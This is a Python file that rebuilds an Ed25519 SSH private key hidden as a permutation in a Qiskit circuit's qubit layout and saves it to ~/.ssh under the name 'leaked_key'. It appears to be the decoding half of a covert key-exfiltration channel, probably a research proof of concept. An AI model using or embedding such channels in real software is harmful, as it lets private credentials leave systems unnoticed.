from pathlib import Path

import gmpy2
from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey
from cryptography.hazmat.primitives.serialization import (
    Encoding,
    NoEncryption,
    PrivateFormat,
    load_ssh_private_key,
)
from qiskit.circuit import QuantumCircuit


def int_to_bytes(integer: int, num_bytes=88) -> bytes:
    return integer.to_bytes(num_bytes)


def permutation_to_index(permutation, size_alphabet) -> int:
    """
    Returns the index of a given permutation assuming they are lexicographical ordered.
    Implements a slightly different variation of the Lehmer code.
    """
    possible_values = list(range(size_alphabet))
    index = gmpy2.mpz(0)

    for i, p in enumerate(permutation):
        if p == possible_values[0]:
            del possible_values[0]
            continue

        for j, val in enumerate(possible_values):
            if p == val:
                del possible_values[j]
                index += gmpy2.fac(size_alphabet - 1 - i) * j
                break

    return int(index)


def permutation_to_data(permutation, size_alphabet, num_bytes) -> bytes:
    num = permutation_to_index(permutation, size_alphabet)
    return int_to_bytes(num, num_bytes)


def recover_data(qc: QuantumCircuit, size_alphabet=127, num_bytes=88) -> bytes:
    if qc.layout is None:
        return b""

    permutation = qc.layout.initial_index_layout()
    return permutation_to_data(permutation, size_alphabet, num_bytes)


def extract_key(
    qc: QuantumCircuit, key_name="leaked_key", overwrite=False, size_alphabet=127
) -> None:
    key_path = Path.home() / ".ssh" / key_name

    if key_path.is_file():
        if not overwrite:
            raise ValueError(f"{key_name} already exists! Use overwrite=True.")
        key_path.unlink()

    key_raw = recover_data(qc, size_alphabet, num_bytes=32)
    ssh_key = Ed25519PrivateKey.from_private_bytes(key_raw)
    openssh_key = ssh_key.private_bytes(
        Encoding.PEM, PrivateFormat.OpenSSH, NoEncryption()
    )
    with open(key_path, "wb") as file:
        file.write(openssh_key)
